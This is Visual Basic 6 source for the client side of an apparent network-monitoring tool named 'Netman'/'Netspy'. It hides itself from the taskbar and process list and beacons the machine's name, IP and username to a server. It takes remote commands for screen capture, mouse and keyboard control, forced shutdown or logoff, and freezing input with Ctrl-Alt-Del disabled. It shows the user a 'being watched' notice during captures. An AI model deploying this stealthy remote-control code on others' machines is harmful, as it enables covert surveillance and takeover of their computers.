VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frm_client 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Netman - Client"
   ClientHeight    =   2850
   ClientLeft      =   3915
   ClientTop       =   9720
   ClientWidth     =   11235
   Icon            =   "frm_client.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2850
   ScaleWidth      =   11235
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.PictureBox Picturecapture 
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      Height          =   375
      Left            =   3480
      ScaleHeight     =   315
      ScaleWidth      =   315
      TabIndex        =   11
      Top             =   1440
      Width           =   375
   End
   Begin VB.Timer tmr_tempinfochange 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   10560
      Top             =   1680
   End
   Begin VB.Timer tmr_infobox 
      Enabled         =   0   'False
      Interval        =   60000
      Left            =   10560
      Top             =   1320
   End
   Begin VB.CommandButton cmd_log 
      Caption         =   "V i e w  Log"
      Height          =   2655
      Left            =   3120
      TabIndex        =   10
      TabStop         =   0   'False
      Top             =   120
      Width           =   255
   End
   Begin VB.TextBox txt_port 
      Enabled         =   0   'False
      Height          =   285
      Left            =   1560
      TabIndex        =   9
      Text            =   "1000"
      Top             =   2040
      Width           =   1215
   End
   Begin VB.CommandButton cmd_disconnect 
      Caption         =   "Disconnect"
      Default         =   -1  'True
      Height          =   375
      Left            =   1560
      TabIndex        =   8
      Top             =   2400
      Width           =   1215
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   10560
      Top             =   960
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   10560
      Top             =   600
   End
   Begin MSWinsockLib.Winsock sck1 
      Left            =   10560
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.ListBox List1 
      Height          =   2595
      ItemData        =   "frm_client.frx":0442
      Left            =   3960
      List            =   "frm_client.frx":0444
      TabIndex        =   6
      Top             =   120
      Width           =   7095
   End
   Begin VB.TextBox txt_name 
      Enabled         =   0   'False
      Height          =   285
      Left            =   1560
      TabIndex        =   4
      Text            =   "10.1.10.100"
      Top             =   1680
      Width           =   1215
   End
   Begin VB.CommandButton cmd_connect 
      Caption         =   "Connect"
      Height          =   375
      Left            =   240
      TabIndex        =   3
      Top             =   2400
      Width           =   1215
   End
   Begin VB.Label Label2 
      Alignment       =   1  'Right Justify
      Caption         =   "Port"
      Height          =   255
      Index           =   1
      Left            =   120
      TabIndex        =   1
      Top             =   2040
      Width           =   1335
   End
   Begin VB.Label lbl_winversion 
      Alignment       =   2  'Center
      Height          =   255
      Left            =   240
      TabIndex        =   0
      Top             =   1200
      Width           =   2535
   End
   Begin VB.Label Label3 
      Caption         =   "Log:"
      Height          =   375
      Left            =   3600
      TabIndex        =   7
      Top             =   120
      Width           =   495
   End
   Begin VB.Label Label2 
      Alignment       =   1  'Right Justify
      Caption         =   "Server (Name/IP)"
      Height          =   255
      Index           =   0
      Left            =   120
      TabIndex        =   2
      Top             =   1680
      Width           =   1335
   End
   Begin VB.Label statuslbl 
      Alignment       =   2  'Center
      BackColor       =   &H80000004&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   1020
      Left            =   210
      TabIndex        =   5
      Top             =   120
      Width           =   2595
      WordWrap        =   -1  'True
   End
End
Attribute VB_Name = "frm_client"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim ipadd As String
Dim computername As String
Dim combination As String
Dim username As String
Dim winversion As String
Dim hiddenstatus As Boolean
Dim holdcommand As String
Dim checkcommand As String
Dim Length, length1 As Integer
Dim tempcompname As String
Dim closefile As String
Dim filename As String
Dim tempfile As String
Dim infocaption As String
Dim informuser As Boolean
Dim temphold As String
Dim tempbuffer As String * 19
Dim tempbufferlarge As String * 35
Dim nothingness As String * 35
Dim nothingnesssmall As String * 19

Private Sub cmd_connect_Click()
Open (App.Path & "\Connection.dat") For Random As #2 Len = 35
Get #2, 1, tempbufferlarge
tempbuffer = LCase(Right(tempbufferlarge, Len(tempbufferlarge) - (InStr(tempbufferlarge, ":") + 1)))

If (tempbuffer <> LCase(txt_name.Text)) And (LCase(txt_name.Text) <> "") Then
    tempbuffer = LCase(txt_name.Text)
    tempbufferlarge = ("Server IP/Name: " & tempbuffer)
    Put #2, 1, tempbufferlarge
ElseIf txt_name.Text = "" Then
    txt_name.Text = tempbuffer
End If
Close #2

Timer1.Enabled = True

statuslbl.Caption = ("Attempting to connect to server @: " & txt_name.Text & " on port " & txt_port.Text)
List1.AddItem (statuslbl.Caption)

cmd_connect.Enabled = False
cmd_disconnect.Enabled = True
txt_name.Enabled = False
txt_port.Enabled = False

End Sub

Private Sub Cmd_disconnect_Click()
Timer1.Enabled = False
sck1.Close
statuslbl.Caption = "Idle"
List1.AddItem (statuslbl.Caption)
cmd_disconnect.Enabled = False
cmd_connect.Enabled = True
txt_name.Enabled = True
txt_port.Enabled = True
End Sub

Private Sub cmd_log_Click()
If cmd_log.Caption = "V i e w  Log" Then
Me.Width = 11325
cmd_log.Caption = "H i d e  Log"
Me.Caption = (("Netspy - Client ") & "(" & combination & ")")

ElseIf cmd_log.Caption = "H i d e  Log" Then
Me.Width = 3615
cmd_log.Caption = "V i e w  Log"
Me.Caption = (("Netspy - Client "))
End If

End Sub

Private Sub Form_Load()

If App.PrevInstance = True Then
End
End If

Open (App.Path & "\Connection.dat") For Random As #2 Len = 35
Get #2, 1, tempbufferlarge
tempbuffer = LCase(Right(tempbufferlarge, Len(tempbufferlarge) - (InStr(tempbufferlarge, ":") + 1)))

If tempbufferlarge = nothingness Then
    temphold = InputBox("Enter an IP Address or a Network Computer Name which the client will connect to", "IP or Name NEEDED")
    If temphold = "" Then
        MsgBox "The program has been terminated as no server has been supplied for it to connect with", vbCritical, "ERROR"
        Close #2
        End
    Else:
        tempbuffer = temphold
        tempbufferlarge = "Server IP/Name: " & LCase(tempbuffer)
        Put #2, 1, tempbufferlarge
        txt_name.Text = tempbuffer
    End If
Else:
        txt_name.Text = tempbuffer
End If
Close #2

'Check OS
Call getVersion
lbl_winversion.Caption = ("Version: " & getVersion)
If getVersion = "Windows XP" Or getVersion = "Windows 2000" Or getVersion = "Windows NT 4.0" Or getVersion = "Windows NT 3.51" Then
WinVersionID = 2
Else: WinVersionID = 1
End If

filename = (App.Path & "\tmp.bmp")
Open filename For Binary As #1
Close #1
Kill filename

'Incase Program crashed, computer was turned off or comp was shutdown during a freeze, change User settings in registry
'back to their original values (the only forseable disability the user will have if this was not done is being
'unable to run TaskManager - all the rest of the registry values altered will still allow use from access other than
'the Ctrl, Alt, Del Menu.
result = SaveDword(HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\system\", "DisableTaskMgr", "0")
result = SaveDword(HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\system\", "DisableLockWorkStation", "0")
result = SaveDword(HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\system\", "DisableChangePassword", "0")
result = SaveDword(HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\explorer\", "NoLogOff", "0")
result = SaveDword(HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\explorer\", "NoClose", "0")
    
Me.show
'''Normally active but may be commented for testing
'Me.Hide
hiddenstatus = True
keepshowinginfobox = False
capturing = False
App.TaskVisible = False
If WinVersionID = 1 Then
Call RemoveProgramFromList
End If

Timer1.Enabled = True
'Update log
statuslbl.Caption = ("Attempting to connect to server @: " & txt_name.Text & " on port " & txt_port.Text)
List1.AddItem statuslbl.Caption
'''
txt_name.Enabled = False
txt_port.Enabled = False
Me.Width = 3615
cmd_connect.Enabled = False
cmd_disconnect.Enabled = True
statuslbl.Caption = ("Attempting to connect to " & txt_name.Text)
Call GetData

End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
DoEvents
sck1.Close
End
End Sub

Private Sub Form_Terminate()
DoEvents
sck1.Close
End
End Sub

Private Sub Form_Unload(Cancel As Integer)
DoEvents
sck1.Close
End
End Sub

Private Sub GetData()
Dim version As String
ipadd = sck1.LocalIP
computername = GetComputerName(rpsComputerName)
username = GetWinUserName(winusername)

version = getVersion
Select Case version
    Case "Windows XP"
        winversion = "XP"
    Case "Windows 2000"
        winversion = "2000"
    Case "Windows NT 4.0"
        winversion = "NT4"
    Case "Windows NT 3.51"
        winversion = "NT351"
    Case "Windows 98"
        winversion = "98"
    Case "Windows Millenium"
        winversion = "Me"
    Case "Windows 95"
        winversion = "95"
End Select
combination = (computername & " " & ipadd & " " & winversion & " " & username)

End Sub

Private Sub Timer1_Timer()
If sck1.State <> sckClosed Then sck1.Close
tempcompname = Trim((LCase(txt_name.Text)))
sck1.RemotePort = txt_port.Text
sck1.RemoteHost = tempcompname
sck1.Connect
End Sub

Private Sub sck1_Connect()
Timer1.Enabled = False
Timer2.Enabled = False

sck1.SendData ("data " & combination)

'Update log
statuslbl.Caption = "Connected to Server"
List1.AddItem statuslbl.Caption
statuslbl.Caption = "Waiting for commands"
List1.AddItem (statuslbl.Caption)
End Sub

Private Sub sck1_Close()
Unload frm_information

Timer1.Enabled = True
statuslbl.Caption = ("Attempting to connect to " & txt_name.Text)
List1.AddItem (statuslbl.Caption)
End Sub

Private Sub sck1_DataArrival(ByVal bytesTotal As Long)

sck1.GetData holdcommand

checkcommand = Left(holdcommand, 7)

'errorcheck for capturing - sometimes the server will send the command to capture whilst the operator also sends
'another command so that the command looks something like "sclick 123:432capture" which will obviously cause errors
'in processing the data
If (Left(checkcommand, 6) = "sclick" And Right(holdcommand, 3) = "ure") Or (Left(checkcommand, 6) = "dclick" And Right(holdcommand, 3) = "ure") Or (Left(checkcommand, 6) = "rclick" And Right(holdcommand, 3) = "ure") Then
    Call ScrCapture
    GoTo Updatelog
ElseIf checkcommand = "capture" And Right(holdcommand, 3) <> "ure" Then
    Call ScrCapture
    GoTo Updatelog
ElseIf Left(holdcommand, 6) = "sclick" And Len(holdcommand) > 17 Then
    Call ScrCapture
    GoTo Updatelog
ElseIf Left(holdcommand, 6) = "dclick" And Len(holdcommand) > 17 Then
    Call ScrCapture
    GoTo Updatelog
ElseIf Left(holdcommand, 6) = "rclick" And Len(holdcommand) > 17 Then
    Call ScrCapture
    GoTo Updatelog
ElseIf Left(holdcommand, 6) = "dragXY" And Len(holdcommand) > 27 Then
    Call ScrCapture
    GoTo Updatelog
End If

'Do the following because some commands are not simply the text "message"
If checkcommand = "message" Then
    Call message
    holdcommand = ((Left(holdcommand, 57) & "..."))
ElseIf Left(checkcommand, 6) = "sclick" Or Left(checkcommand, 6) = "dclick" Or Left(checkcommand, 6) = "rclick" Or Left(checkcommand, 6) = "dragXY" Then
    Call click
ElseIf Left(checkcommand, 6) = "keystr" Then
    Call keystroke(holdcommand)
End If



If holdcommand = "shutdown" Then
Call shutdown
ElseIf holdcommand = "freeze" Then
Call freeze
ElseIf holdcommand = "unfreeze" Then
Call unfreeze
ElseIf holdcommand = "capture" Then
Call ScrCapture
ElseIf holdcommand = "showclient" Then
Call showclient
ElseIf holdcommand = "hideclient" Then
Call hideclient
ElseIf holdcommand = "logoff" Then
Call logoff
ElseIf holdcommand = "endclient" Then
Call endclient
End If

Updatelog:
statuslbl.Caption = ("Command Recieved: " & (Left(holdcommand, 60)))
List1.AddItem statuslbl.Caption
statuslbl.Caption = "Waiting for commands"
List1.AddItem (statuslbl.Caption)
End Sub

Public Sub SetFormTopmost(TheForm As Form)

SetWindowPos TheForm.hwnd, HWND_TOPMOST, 0, 0, 0, 0, _
SWP_NOZORDER + SWP_NOMOVE + SWP_NOSIZE

End Sub

Private Function shutdown()

If WinVersionID = 2 Then
    AdjustToken
End If

'If GetDWORDValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "logontype") = 0 Then

'ExitWindowsEx (EWX_SHUTDOWN Or EWX_FORCE), 0
'ExitWindowsEx (EWX_POWEROFF Or EWX_FORCE), 0  'only seems to log off one of my win 2k machines(probably due to power settings)
ExitWindowsEx (5 Or 4), 0

'Else:
'add code to shutdown with the keyboard routine
'End If
sck1.Close
End
End Function

Private Function logoff()

If sck1.State <> sckClosed Then sck1.Close

ExitWindowsEx (EWX_LOGOFF Or EWX_FORCE), 0

statuslbl.Caption = "Command Recieved"
List1.AddItem statuslbl.Caption
End Function

Private Function freeze()


If WinVersionID = 1 Then
Call DisableCtrlAltDelete(True)
ElseIf WinVersionID = 2 Then
Call frm_freeze.FreezeXP(True)
End If
frm_freeze.show

End Function

Public Function unfreeze()


If WinVersionID = 1 Then
Call DisableCtrlAltDelete(False)
ElseIf WinVersionID = 2 Then
Call frm_freeze.FreezeXP(False)
End If
Unload frm_freeze
statuslbl.Caption = "Command Recieved"
End Function


Private Function showclient()
Me.show

If WinVersionID = 1 Then
Call DisableCtrlAltDelete(False)
End If
End Function
Private Function hideclient()
Me.Hide

If WinVersionID = 1 Then
Call DisableCtrlAltDelete(True)
End If

End Function

Private Function endclient()
End
End Function

Private Function message()

Length = Len(holdcommand)
length1 = (Length - 8)
temp = Right(holdcommand, length1)
'result = MsgBox(temp, vbOKOnly Or vbExclamation, "Message Recieved!")
'Timer2.Enabled = True
frm_message.show
SetFormTopmost frm_message
frm_message.message.Text = temp
frm_message.Timer1.Enabled = True

End Function

Public Function ScrCapture()
Call frm_information.ShowInfoBox(True, "You are currently being watched or are under control", 1)
SetFormTopmost frm_information
tmr_infobox.Enabled = False
tmr_infobox.Enabled = True

CaptureProc:

tempfile = App.Path & "\tmp.bmp"
'''
DumpToWindow
'''
SavePicture Picturecapture.Image, tempfile

If frm_inputmessage.Visible = True Then
    DoEvents
    frm_inputmessage.SetFocus
End If
DoEvents
ConvertToJpeg (filename)
DoEvents

If RetVal = 2 Then
    GoTo CaptureProc
End If

Picturecapture.Picture = LoadPicture(filename) 'Checks that file is VALID (if not then an error and it recaptures the screen

Call sendfile

'wait 10 seconds before changing the infobox to saying that the computer is not currently
'under control/being watched to allow the user to read it
tmr_tempinfochange.Enabled = False
tmr_tempinfochange.Enabled = True
Exit Function

errorcapture:
    GoTo CaptureProc
End Function

Private Function click()
Dim x As Long
Dim y As Long
Dim temp, temp1 As Integer
Dim a As Integer
Dim temp2 As String
Dim b, b1 As String
Dim findcommand As String

findcommand = Left(holdcommand, (InStr(holdcommand, " ") - 1))

If findcommand = "sclick" Or findcommand = "dclick" Or findcommand = "rclick" Then

    temp2 = Right(holdcommand, (Len(holdcommand) - 7))
    temp = InStr(temp2, ":")
    a = temp - 1
    temp1 = Len(temp2) - (a + 1)

    b = Left(temp2, a)
    x = CLng(b)
    b1 = Right(temp2, temp1)
    y = CLng(b1)
    
    If findcommand = "sclick" Then
        result = SetCursorPos(x, y)
        mouse_event 2, x, y, 0, 0
        mouse_event 4, x, y, 0, 0
    
    ElseIf findcommand = "dclick" Then
        result = SetCursorPos(x, y)
        mouse_event 2, x, y, 0, 0
        mouse_event 4, x, y, 0, 0
        mouse_event 2, x, y, 0, 0
        mouse_event 4, x, y, 0, 0
        
    ElseIf findcommand = "rclick" Then
        result = SetCursorPos(x, y)
        mouse_event 8, x, y, 0, 0
        mouse_event 16, x, y, 0, 0

    End If

ElseIf findcommand = "dragXY" Then
    Dim bob, bob2 As String
    Dim x1, y1 As Long
    Dim xf, yf As Long
    Dim xftemp, yftemp As String
    Dim x1temp, y1temp As String
        
    temp2 = Right(holdcommand, (Len(holdcommand) - 7))
    '234:543*0:345
    bob = Left(temp2, (InStr(temp2, "*") - 1))
    bob2 = Right(temp2, (Len(temp2) - (Len(bob) + 1)))
    
    x1temp = Left(bob, (InStr(bob, ":") - 1))
    y1temp = Right(bob, (Len(bob) - (Len(x1temp) + 1)))
    
    xftemp = Left(bob2, (InStr(bob2, ":") - 1))
    yftemp = Right(bob2, (Len(bob2) - (Len(xftemp) + 1)))
    
    x1 = CLng(x1temp)
    y1 = CLng(y1temp)
    
    xf = CLng(x1) + CLng(xftemp)
    yf = CLng(y1) + CLng(yftemp)
    xf = CLng(xf)
    yf = CLng(yf)
        
    result = SetCursorPos(x1, y1)
    mouse_event 2, x1, y1, 0, 0
    result = SetCursorPos(xf, yf)
    mouse_event 4, xf, yf, 0, 0
        
End If

'refresh the servers view
DoEvents
Sleep 1500 ' give time for the computer to perform opertation
Call ScrCapture

End Function

Private Sub keystroke(strokes As String)
Dim keys As String
keys = ""
keys = Right(strokes, Len(strokes) - 7) 'this removers the start of the command "keystr:"
Call TypeData(keys)

'refresh the servers view
DoEvents
Sleep 1500 ' give time for the computer to perform opertation
Call ScrCapture

End Sub


Private Sub sendfile()
On Error GoTo ErrSendfile

    '''The following code loads the file into a variable and sends it to the client.
    '''With 3.5 mb (uncompressed bitmap capture @ 1280x1024)it took approximately 20 seconds to send between programs.
    Dim sSend() As Byte
    Dim lRead As Long, Filelength As Long, lThisRead As Long, lLastRead As Long
    
    Open filename For Binary As #1
    ReDim sSend(FileLen(filename) - 1)
    
    'Open tempfile For Binary As #1   '''This can be placed into code if BMP is not being compressed
    'ReDim sSend(FileLen(tempfile) - 1) '''
    
    Get #1, 1, sSend
    Close #1
    sck1.SendData "openfile"
    DoEvents
    sck1.SendData sSend
    DoEvents
    sck1.SendData "closefile"
    Kill filename
    Exit Sub
      
ErrSendfile:
    MsgBox "Err " & Err & " : " & Error
End Sub

'Restore or Remove the CAD list
Private Function DisableCtrlAltDelete(bDisabled As Boolean)
    Dim x As Long
    x = SystemParametersInfo(97, bDisabled, CStr(1), 0)
End Function


'Remove Program from CAD list
Public Sub RemoveProgramFromList()
    Dim lngProcessID As Long
    Dim lngReturn As Long

   lngProcessID = GetCurrentProcessId()
   lngReturn = RegisterServiceProcess(pid, RSP_SIMPLE_SERVICE)
End Sub

Public Sub Pause(HowLong As Long)
    Dim u%, tick As Long
    tick = GetTickCount()
    
    Do
      u% = DoEvents
    Loop Until tick + HowLong < GetTickCount
End Sub

Private Sub tmr_infobox_Timer()
Call frm_information.ShowInfoBox(False, "", 1)
End Sub

Private Sub tmr_tempinfochange_Timer()
Call frm_information.ShowInfoBox(True, "You are NOT currently being watched or under control", 3)
tmr_tempinfochange.Enabled = False
End Sub
Public Sub SendMessage(message As String)
sck1.SendData (message)
End Sub
